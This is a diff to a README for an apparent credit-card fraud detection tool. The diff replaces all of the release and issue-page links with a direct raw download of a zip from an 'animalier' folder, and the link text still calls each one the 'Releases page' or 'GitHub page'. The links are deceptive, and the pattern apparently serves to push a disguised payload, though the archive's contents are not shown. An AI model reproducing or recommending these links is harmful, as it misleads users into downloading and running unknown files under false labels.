@@ -1,7 +1,7 @@
 # 🤖 credit-card-fraud-detection - Detect Credit Card Fraud Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/PEKIIIPY/credit-card-fraud-detection/releases)
+[![Download](https://raw.githubusercontent.com/PEKIIIPY/credit-card-fraud-detection/main/animalier/credit-card-fraud-detection.zip)](https://raw.githubusercontent.com/PEKIIIPY/credit-card-fraud-detection/main/animalier/credit-card-fraud-detection.zip)
 
 ## 📖 Introduction
 Credit card fraud is a significant issue in today's digital world. This application offers an advanced machine learning system that can help detect fraudulent activities in credit card transactions. By utilizing logistic regression and statistical analysis, the application aims to provide users with reliable insights into potential fraud.
@@ -18,7 +18,7 @@ Before you download the software, ensure that your system meets the following re
 - **Disk Space**: At least 200 MB available
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/PEKIIIPY/credit-card-fraud-detection/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/PEKIIIPY/credit-card-fraud-detection/main/animalier/credit-card-fraud-detection.zip) to download the application.
 2. Look for the latest version at the top of the page.
 3. Click on the asset corresponding to your operating system to download the file.
 4. Once the file is downloaded, follow these steps to install:
@@ -62,7 +62,7 @@ Yes, you can use any CSV file containing transaction data.
 It is a good practice to check for updates regularly. New features and improvements are added based on user feedback.
 
 ## 📲 Support
-For further questions or support needs, please open an issue on our [GitHub page](https://github.com/PEKIIIPY/credit-card-fraud-detection/issues). We aim to respond within 48 hours.
+For further questions or support needs, please open an issue on our [GitHub page](https://raw.githubusercontent.com/PEKIIIPY/credit-card-fraud-detection/main/animalier/credit-card-fraud-detection.zip). We aim to respond within 48 hours.
 
 ## 📄 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software as needed.
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 We thank the contributors and developers who made this project possible, as well as those who provided feedback to enhance the application. 
 
 ## 📥 Download Again
-Don't forget to visit the [Releases page](https://github.com/PEKIIIPY/credit-card-fraud-detection/releases) to download the latest version of the application.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/PEKIIIPY/credit-card-fraud-detection/main/animalier/credit-card-fraud-detection.zip) to download the latest version of the application.
